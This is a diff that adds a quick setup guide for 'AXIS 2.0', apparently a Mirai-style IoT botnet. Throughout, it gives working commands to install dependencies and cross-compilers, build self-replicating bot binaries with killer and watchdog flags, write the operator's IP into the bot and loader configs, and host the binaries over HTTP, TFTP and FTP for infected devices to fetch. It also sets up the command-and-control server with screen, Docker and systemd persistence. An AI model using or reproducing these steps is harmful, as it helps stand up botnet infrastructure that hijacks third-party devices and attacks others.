@@ -1,0 +1,232 @@
+================================================================================
+                    AXIS 2.0 QUICK SETUP GUIDE
+              Minimal/Universal Installation Instructions
+================================================================================
+
+This is a quick reference guide for experienced users.
+
+================================================================================
+PREREQUISITES
+================================================================================
+
+Minimum Requirements:
+- Linux server (Ubuntu/Debian/CentOS)
+- 1GB RAM minimum (2GB recommended)
+- 10GB disk space
+- Root access
+- Public IP address
+
+================================================================================
+ONE-LINER DEPENDENCY INSTALL (Ubuntu/Debian)
+================================================================================
+
+apt update && apt install -y golang-go mariadb-server apache2 tftpd-hpa vsftpd build-essential screen wget curl gcc-arm-linux-gnueabi gcc-mips-linux-gnu
+
+================================================================================
+QUICK DATABASE SETUP
+================================================================================
+
+mysql -u root -e "CREATE DATABASE AXIS2; CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis123'; GRANT ALL ON AXIS2.* TO 'axis'@'localhost'; FLUSH PRIVILEGES;"
+mysql -u root AXIS2 < database.sql
+mysql -u root AXIS2 -e "UPDATE users SET password='NewPass123!' WHERE username='admin';"
+
+================================================================================
+QUICK BUILD
+================================================================================
+
+cd "production source"
+chmod +x build.sh
+
+# Install Go deps
+cd cnc && go mod init production-cnc && go get github.com/go-sql-driver/mysql github.com/mattn/go-shellwords && cd ..
+
+# Build
+./build.sh
+
+================================================================================
+QUICK CONFIGURATION
+================================================================================
+
+# Replace with your server IP
+SERVER_IP=$(curl -s ifconfig.me)
+
+# Update configs
+sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h
+sed -i "s/0.0.0.0/$SERVER_IP/g" loader/config.h
+sed -i "s/0.0.0.0/$SERVER_IP/g" dlr/dlr.h
+
+echo "Server IP configured: $SERVER_IP"
+
+================================================================================
+QUICK START
+================================================================================
+
+# Start services
+screen -S cnc -dm ./cnc_server
+screen -S scan -dm ./scanListen
+
+echo "AXIS 2.0 started!"
+echo "Connect: telnet $SERVER_IP 3778"
+echo "Login: admin / admin123"
+
+================================================================================
+MINIMAL INSTALL (No Cross-Compilation)
+================================================================================
+
+# Build only for current architecture
+cd bot
+gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
+strip ../bins/axis.x86_64
+
+# Copy to web dir
+cp ../bins/axis.x86_64 /var/www/html/bins/
+
+================================================================================
+DOCKER SETUP (Alternative)
+================================================================================
+
+# Create Dockerfile
+cat > Dockerfile << 'EOF'
+FROM ubuntu:20.04
+RUN apt update && apt install -y golang-go mariadb-server apache2 build-essential screen
+COPY production\ source /root/production\ source
+WORKDIR /root/production\ source
+EXPOSE 3778 3779 9555 80
+CMD ["./cnc_server"]
+EOF
+
+# Build and run
+docker build -t axis2 .
+docker run -d -p 3778:3778 -p 3779:3779 -p 9555:9555 -p 80:80 --name axis2 axis2
+
+================================================================================
+SYSTEMD SERVICE (Auto-start on boot)
+================================================================================
+
+# Create service file
+cat > /etc/systemd/system/axis2-cnc.service << EOF
+[Unit]
+Description=AXIS 2.0 C&C Server
+After=network.target mariadb.service
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root/production\ source
+ExecStart=/root/production\ source/cnc_server
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Enable and start
+systemctl daemon-reload
+systemctl enable axis2-cnc
+systemctl start axis2-cnc
+
+================================================================================
+VERIFY INSTALLATION
+================================================================================
+
+# Check services
+ps aux | grep -E 'cnc_server|scanListen'
+
+# Check ports
+netstat -tulpn | grep -E '3778|3779|9555'
+
+# Test connection
+echo -e "admin\nadmin123\n" | nc localhost 3778
+
+# Check database
+mysql -u axis -paxis123 AXIS2 -e "SELECT * FROM users;"
+
+================================================================================
+SECURITY CHECKLIST
+================================================================================
+
+[ ] Change default admin password
+[ ] Change database password
+[ ] Configure firewall (only required ports open)
+[ ] Set up fail2ban for SSH
+[ ] Enable automatic security updates
+[ ] Set up regular backups
+[ ] Configure log rotation
+[ ] Set up monitoring/alerting
+
+================================================================================
+COMMON COMMANDS
+================================================================================
+
+# View running screens
+screen -ls
+
+# Attach to screen
+screen -r [name]
+
+# Detach from screen
+# Press Ctrl+A, then D
+
+# Kill screen session
+screen -S [name] -X quit
+
+# View logs
+tail -f logs/commands.txt
+tail -f logs/logins.txt
+tail -f telnet.txt
+
+# Database commands
+mysql -u axis -paxis123 AXIS2
+> SELECT COUNT(*) FROM users;
+> SELECT * FROM history ORDER BY time_sent DESC LIMIT 10;
+
+================================================================================
+FILE LOCATIONS
+================================================================================
+
+Binaries:      /var/www/html/bins/
+               /var/lib/tftpboot/
+               /var/ftp/
+
+Logs:          logs/commands.txt
+               logs/logins.txt
+               telnet.txt
+
+Configs:       cnc/main.go
+               bot/config.h
+               loader/config.h
+               dlr/dlr.h
+
+Database:      AXIS2 (MariaDB/MySQL)
+
+================================================================================
+UPDATING
+================================================================================
+
+# Stop services
+killall cnc_server scanListen loader
+
+# Pull changes (if using git)
+git pull
+
+# Rebuild
+./build.sh
+
+# Restart
+screen -S cnc -dm ./cnc_server
+screen -S scan -dm ./scanListen
+
+================================================================================
+BACKUP
+================================================================================
+
+# Backup database
+mysqldump -u axis -paxis123 AXIS2 > axis2_backup_$(date +%Y%m%d).sql
+
+# Backup binaries
+tar -czf bins_backup_$(date +%Y%m%d).tar.gz /var/www/html/bins/
+
+# Backup logs
+tar -czf logs_backup_$(date +%Y%m%d).tar.gz logs/
+
+================================================================================
